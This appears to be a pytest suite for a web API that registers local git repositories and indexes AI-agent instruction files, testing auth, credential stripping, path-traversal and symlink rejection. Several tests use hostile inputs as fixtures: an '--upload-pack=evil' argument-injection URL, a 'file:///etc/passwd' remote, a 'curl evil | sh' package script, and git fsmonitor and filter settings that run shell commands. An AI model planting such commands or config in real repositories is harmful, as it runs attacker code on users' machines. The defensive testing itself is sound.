import json
import os
import sys

import pytest
from tests.fixtures.repos import git, make_claude_repo, make_repo, write


def add(client, auth, path, **extra):
    return client.post(
        "/api/projects", json={"name": "Demo App", "path": str(path), **extra}, headers=auth
    )


def test_requires_auth_and_csrf(client, auth, tmp_path):
    assert client.get("/api/projects").status_code == 401
    token_only = {"X-CPM-Token": auth["X-CPM-Token"]}
    r = client.post("/api/projects", json={"name": "x", "path": str(tmp_path)}, headers=token_only)
    assert r.status_code == 403


def test_scenario1_local_git_repo(client, auth, tmp_path):
    repo = make_repo(tmp_path / "demo", remote="https://u:tok3n@github.com/example/demo.git")
    write(repo, "dirty.txt")
    r = add(client, auth, repo)
    assert r.status_code == 201, r.text
    p = r.json()
    assert p["slug"] == "demo-app" and p["remote_url"] == "https://github.com/example/demo.git"
    assert "tok3n" not in json.dumps(p) and p["needs_remote"] is False
    g = p["git"]
    assert g["is_repo"] and g["branch"] == "main" and len(g["head"]) == 40
    assert g["dirty_count"] == 1 and "dirty.txt" in g["dirty_sample"]
    assert "tok3n" not in json.dumps(g)
    assert p["workspace_trusted"] is False and p["integration_mode"] == "pr_only"
    assert client.get("/api/projects", headers=auth).json()["projects"][0]["id"] == p["id"]


def test_scenario2_manual_remote(client, auth, tmp_path):
    repo = make_repo(tmp_path / "noremote", remote=None)
    p = add(client, auth, repo).json()
    assert p["remote_url"] is None and p["needs_remote"] is True
    r = client.put(
        f"/api/projects/{p['id']}/remote",
        json={"remote_url": "git@github.com:example/demo.git"},
        headers=auth,
    )
    assert r.json()["remote_url"] == "git@github.com:example/demo.git"
    for bad in ["--upload-pack=evil", "file:///etc/passwd", "ftp://x/y", "https://a b/c"]:
        r = client.put(f"/api/projects/{p['id']}/remote", json={"remote_url": bad}, headers=auth)
        assert r.status_code == 422, bad
    assert client.put(
        f"/api/projects/{p['id']}/remote", json={"remote_url": None}, headers=auth
    ).json()["needs_remote"]


def test_scenario3_claude_md_and_memory(client, auth, tmp_path):
    repo = make_claude_repo(tmp_path / "rich")
    p = add(client, auth, repo).json()
    by = {s["rel_path"]: s for s in p["sources"]}
    assert by["CLAUDE.md"]["kind"] == "instruction" and len(by["CLAUDE.md"]["content_hash"]) == 64
    assert by["AGENTS.md"]["kind"] == "instruction"
    assert by["MEMORY.md"]["kind"] == "memory"
    assert by[".claude/rules/style.md"]["kind"] == "instruction"
    assert by["docs/TODO.md"]["kind"] == "task"
    # hooks/MCP-capable files are inert until the workspace is trusted
    s = by[".claude/settings.json"]
    assert s["requires_trust"] and not s["active"] and by["CLAUDE.md"]["active"] is True
    assert p["policy"] == {
        "setting_sources": [], "allow_hooks": False, "allow_mcp": False,
        "allow_project_scripts": False,
    }  # fmt: skip
    t = client.put(f"/api/projects/{p['id']}/trust", json={"trusted": True}, headers=auth).json()
    assert t["policy"]["setting_sources"] == ["project"] and t["policy"]["allow_hooks"]
    assert {x["rel_path"]: x for x in t["sources"]}[".claude/settings.json"]["active"]


def test_contents_are_never_returned(client, auth, tmp_path):
    repo = make_claude_repo(tmp_path / "secret")
    write(repo, "CLAUDE.md", "TOP-SECRET-INSTRUCTION")
    assert "TOP-SECRET-INSTRUCTION" not in add(client, auth, repo).text


def test_include_exclude_survives_refresh_and_tracks_changes(client, auth, tmp_path):
    repo = make_claude_repo(tmp_path / "inc")
    p = add(client, auth, repo).json()
    sid = next(s["id"] for s in p["sources"] if s["rel_path"] == "AGENTS.md")
    r = client.put(f"/api/projects/{p['id']}/sources/{sid}", json={"included": False}, headers=auth)
    assert not {s["rel_path"]: s for s in r.json()["sources"]}["AGENTS.md"]["included"]
    old = {s["rel_path"]: s["content_hash"] for s in p["sources"]}["CLAUDE.md"]
    write(repo, "CLAUDE.md", "changed\n")
    (repo / "MEMORY.md").unlink()
    r = client.post(f"/api/projects/{p['id']}/refresh", headers=auth).json()
    by = {s["rel_path"]: s for s in r["sources"]}
    assert by["CLAUDE.md"]["content_hash"] != old
    assert "MEMORY.md" not in by and by["AGENTS.md"]["included"] is False
    # source ids of another project cannot be toggled through this project
    q = add(client, auth, make_repo(tmp_path / "other"), name="Other").json()
    r = client.put(f"/api/projects/{q['id']}/sources/{sid}", json={"included": True}, headers=auth)
    assert r.status_code == 404


def test_custom_pattern_and_traversal_rejected(client, auth, tmp_path):
    repo = make_repo(tmp_path / "pat", remote=None)
    write(repo, "notes/plan.md")
    p = add(client, auth, repo).json()
    r = client.post(
        f"/api/projects/{p['id']}/patterns",
        json={"pattern": "notes/*.md", "kind": "task"},
        headers=auth,
    )
    assert any(
        s["rel_path"] == "notes/plan.md" and s["kind"] == "task" for s in r.json()["sources"]
    )
    for bad in ["../*.md", "/etc/*", "C:/Windows/*", "a/../../b", "..\\x"]:
        r = client.post(
            f"/api/projects/{p['id']}/patterns", json={"pattern": bad, "kind": "task"}, headers=auth
        )
        assert r.status_code == 422, bad


@pytest.mark.skipif(sys.platform == "win32", reason="symlink creation needs privileges on Windows")
def test_symlink_escaping_the_project_is_ignored(client, auth, tmp_path):
    outside = tmp_path / "outside.md"
    outside.write_text("secret")
    repo = make_repo(tmp_path / "link", remote=None)
    os.symlink(outside, repo / "CLAUDE.md")
    p = add(client, auth, repo).json()
    assert "CLAUDE.md" not in {s["rel_path"] for s in p["sources"]}


@pytest.mark.skipif(sys.platform == "win32", reason="uses a POSIX shell command as the payload")
def test_hostile_git_config_does_not_execute(client, auth, tmp_path):
    repo = make_repo(tmp_path / "evil", remote=None)
    marker = tmp_path / "pwned"
    git(repo, "config", "core.fsmonitor", f"touch {marker}")
    git(repo, "config", "core.hooksPath", str(tmp_path / "hooks"))
    r = add(client, auth, repo)
    assert r.status_code == 201 and r.json()["git"]["is_repo"]
    assert not marker.exists()


def test_rejects_bad_paths_duplicates_and_data_dir(client, auth, tmp_path, settings):
    assert add(client, auth, tmp_path / "missing").status_code == 422
    assert add(client, auth, "relative/dir").status_code == 422
    assert add(client, auth, "//server/share").status_code == 422
    assert add(client, auth, tmp_path / ".." / "x").status_code == 422
    assert add(client, auth, settings.data_dir).status_code == 422
    repo = make_repo(tmp_path / "dup", remote=None)
    assert add(client, auth, repo).status_code == 201
    assert add(client, auth, repo, name="again").status_code == 409
    assert add(client, auth, str(repo) + "/", name="again2").status_code == 409


def test_non_git_folder_and_slug_collision(client, auth, tmp_path):
    a = tmp_path / "plain"
    a.mkdir()
    p = add(client, auth, a).json()
    assert p["git"]["is_repo"] is False and p["needs_remote"]
    b = add(client, auth, make_repo(tmp_path / "second", remote=None)).json()
    assert b["slug"] == "demo-app-2"


def test_command_detection_reports_runner_not_script_bodies(client, auth, tmp_path):
    repo = make_repo(tmp_path / "cmds", remote=None)
    write(repo, "package.json", json.dumps({"scripts": {"test": "curl evil | sh", "dev": "x"}}))
    write(repo, "Makefile", "build:\n\techo hi\n")
    write(repo, "ProjectSettings/ProjectVersion.txt", "m_EditorVersion: 6000.3.25f1\n")
    p = add(client, auth, repo).json()
    cmds = {(c["purpose"], tuple(c["argv"])) for c in p["commands"]}
    assert ("test", ("npm", "run", "test")) in cmds and ("build", ("make", "build")) in cmds
    assert "curl" not in json.dumps(p["commands"]) and p["unity_version"] == "6000.3.25f1"


def test_nirandyr_profile_adds_sources_and_defaults(client, auth, tmp_path):
    assert "nirandyr" in [
        x["id"] for x in client.get("/api/profiles", headers=auth).json()["profiles"]
    ]
    repo = make_repo(tmp_path / "game", remote=None)
    write(repo, "docs/JOB_BOARD.md")
    write(repo, "docs/COORDINATOR_INBOX.md")
    p = add(client, auth, repo, profile="nirandyr").json()
    assert p["remote_url"] == "https://github.com/Xxobster/Nirandyr"  # profile fallback
    kinds = {s["rel_path"]: s["kind"] for s in p["sources"]}
    assert kinds["docs/JOB_BOARD.md"] == "task" and kinds["docs/COORDINATOR_INBOX.md"] == "task"
    assert (
        add(client, auth, make_repo(tmp_path / "g2", remote=None), profile="../x").status_code
        == 422
    )
    assert (
        add(client, auth, make_repo(tmp_path / "g3", remote=None), profile="nope").status_code
        == 422
    )


def test_remove_only_unregisters(client, auth, tmp_path):
    repo = make_claude_repo(tmp_path / "keep")
    p = add(client, auth, repo).json()
    assert client.delete(f"/api/projects/{p['id']}", headers=auth).status_code == 204
    assert (repo / "CLAUDE.md").exists() and client.get(
        f"/api/projects/{p['id']}", headers=auth
    ).status_code == 404
    assert client.get("/api/projects", headers=auth).json()["projects"] == []


@pytest.mark.skipif(sys.platform == "win32", reason="uses a POSIX shell command as the payload")
def test_hostile_content_filter_does_not_execute(client, auth, tmp_path):
    repo = make_repo(tmp_path / "filt", remote=None)
    marker = tmp_path / "filter-pwned"
    write(repo, ".gitattributes", "data.txt filter=evil\n")
    write(repo, "data.txt", "aaaa\n")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "data")
    git(repo, "config", "filter.evil.clean", f"touch {marker}; cat")
    write(repo, "data.txt", "bbbb\n")  # same size, so git must run the filter to compare
    r = add(client, auth, repo)
    assert r.status_code == 201 and r.json()["git"]["is_repo"]
    assert not marker.exists()


def test_detached_head_still_reports_status(client, auth, tmp_path):
    repo = make_repo(tmp_path / "det", remote="https://github.com/example/det")
    git(repo, "checkout", "-q", "--detach")
    write(repo, "dirty.txt")
    g = add(client, auth, repo).json()["git"]
    assert g["branch"] is None and g["dirty_count"] == 1 and g["remotes"] and g["branches"]


def test_long_name_slug_collision_terminates(client, auth, tmp_path):
    name = "a" * 80
    for i in range(3):
        r = add(client, auth, make_repo(tmp_path / f"l{i}", remote=None), name=name)
        assert r.status_code == 201 and len(r.json()["slug"]) <= 64
    assert r.json()["slug"].endswith("-3")


def test_unregister_drops_custom_patterns(client, auth, tmp_path):
    a = make_repo(tmp_path / "pa", remote=None)
    write(a, "notes/x.md")
    p = add(client, auth, a).json()
    client.post(
        f"/api/projects/{p['id']}/patterns",
        json={"pattern": "notes/*.md", "kind": "task"},
        headers=auth,
    )
    client.delete(f"/api/projects/{p['id']}", headers=auth)
    b = make_repo(tmp_path / "pb", remote=None)
    write(b, "notes/y.md")
    q = add(client, auth, b).json()
    assert "notes/y.md" not in {s["rel_path"] for s in q["sources"]}
